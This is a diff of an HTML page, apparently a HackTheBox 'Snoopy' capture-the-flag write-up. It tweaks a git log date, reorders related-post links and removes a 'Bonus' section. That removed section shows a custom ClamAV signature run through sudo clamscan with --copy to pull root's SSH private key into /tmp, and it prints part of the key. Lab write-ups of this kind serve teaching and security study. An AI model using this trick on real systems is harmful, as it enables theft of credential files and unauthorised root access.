@@ -1186,7 +1186,7 @@ After spending more time troubleshooting, I learn that because the mail is inten
 </span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git log
 </span></span><span class="line"><span class="cl">commit 6d81c284773a4d699ac388166473090e3375beb8 <span class="o">(</span>HEAD -&gt; main<span class="o">)</span>
 </span></span><span class="line"><span class="cl">Author: cbrown &lt;cbrown@snoopy.htb&gt;
-</span></span><span class="line"><span class="cl">Date:   Tue May <span class="m">9</span> 15:33:35 <span class="m">2023</span> +0000
+</span></span><span class="line"><span class="cl">Date:   Tue May <span class="m">09</span> 15:33:35 <span class="m">2023</span> +0000
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="nb">test</span>
 </span></span><span class="line"><span class="cl">
@@ -1472,86 +1472,6 @@ After spending more time troubleshooting, I learn that because the mail is inten
 </span></span><span class="line"><span class="cl">root@snoopy:~# 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="bonus-using-the-custom-virus-database-to-copy-the-private-key">Bonus: Using the custom virus database to copy the private key</h3>
-<p>The same method can be done to swipe the private ssh key. First, <code>xxd</code> an example private key to get the hex values:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ xxd ~/.ssh/id_rsa
-</span></span><span class="line"><span class="cl">00000000: 2d2d 2d2d 2d42 <span class="m">4547</span> 494e 204f <span class="m">5045</span> 4e53  -----BEGIN OPENS
-</span></span><span class="line"><span class="cl">00000010: <span class="m">5348</span> <span class="m">2050</span> <span class="m">5249</span> <span class="m">5641</span> <span class="m">5445</span> 204b <span class="m">4559</span> 2d2d  SH PRIVATE KEY--
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Create a virus database that will flag all private keys:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ cat 1.ndb
-</span></span><span class="line"><span class="cl">Trojan.A:0:*:2d2d2d2d
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Next, copy the private id_rsa to your current location:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/id_rsa --copy<span class="o">=</span>./
-</span></span><span class="line"><span class="cl">Loading:     0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>        1/1 sigs
-</span></span><span class="line"><span class="cl">Compiling:   0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>       40/40 tasks
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/root/.ssh/id_rsa: Trojan.A.UNOFFICIAL FOUND
-</span></span><span class="line"><span class="cl">/root/.ssh/id_rsa: copied to <span class="s1">&#39;/tmp/id_rsa&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">----------- SCAN SUMMARY -----------
-</span></span><span class="line"><span class="cl">Known viruses: <span class="m">1</span>
-</span></span><span class="line"><span class="cl">Engine version: 1.0.0
-</span></span><span class="line"><span class="cl">Scanned directories: <span class="m">0</span>
-</span></span><span class="line"><span class="cl">Scanned files: <span class="m">1</span>
-</span></span><span class="line"><span class="cl">Infected files: <span class="m">1</span>
-</span></span><span class="line"><span class="cl">Data scanned: 0.00 MB
-</span></span><span class="line"><span class="cl">Data read: 0.00 MB <span class="o">(</span>ratio 0.00:1<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Time: 0.014 sec <span class="o">(</span><span class="m">0</span> m <span class="m">0</span> s<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Start Date: 2023:05:09 22:43:31
-</span></span><span class="line"><span class="cl">End Date:   2023:05:09 22:43:31
-</span></span><span class="line"><span class="cl">sbrown@snoopy:/tmp$ cat id_rsa
-</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
-</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-</span></span><span class="line"><span class="cl">NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
-</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
-</span></span></code></pre></td></tr></table>
-</div>
 </div><h2 id="reflection">Reflection</h2>
 <p>I enjoyed the learning process for this box a considerable amount. Even from the beginning of enumerating DNS config files and setting up a mail server, this challenge gave me the opportunity to learn many new things! Although it was revealed to be mostly unintended, I appreciated how there were several possible paths to root. It was fun to discuss with others the ideas they had to manipulate the <code>clamscan</code> behaviors.</p>
 
@@ -1601,6 +1521,30 @@ After spending more time troubleshooting, I learn that because the mail is inten
     <h2 class="section-title">Related content</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-format/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-format/Format.910e024119b03811cd8466e187bde5fe_hucfdd9eb173c0886a8604431711aec1ea_316610_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Format"
+                        
+                        data-hash="md5-kQ4CQRmwOBHNhGbhh73l/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Format</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -1693,30 +1637,6 @@ After spending more time troubleshooting, I learn that because the mail is inten
 
         <div class="article-details">
             <h2 class="article-title">HackTheBox - MonitorsTwo</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/post/hackthebox-mailroom/">
-        
-        
-            <div class="article-image">
-                <img src="/post/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu83fa4872cdc769af1a6c4264f0edd42d_354362_250x150_fill_box_smart1_3.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post HackTheBox - Mailroom"
-                        
-                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">HackTheBox - Mailroom</h2>
         </div>
     </a>
 </article>
@@ -1866,7 +1786,6 @@ After spending more time troubleshooting, I learn that because the mail is inten
     <li><a href="#privilege-escalation">Privilege Escalation</a>
       <ol>
         <li><a href="#abusing-clamav-scanning-to-rewrite-authorized_keys">Abusing ClamAV scanning to rewrite authorized_keys</a></li>
-        <li><a href="#bonus-using-the-custom-virus-database-to-copy-the-private-key">Bonus: Using the custom virus database to copy the private key</a></li>
       </ol>
     </li>
     <li><a href="#reflection">Reflection</a></li>
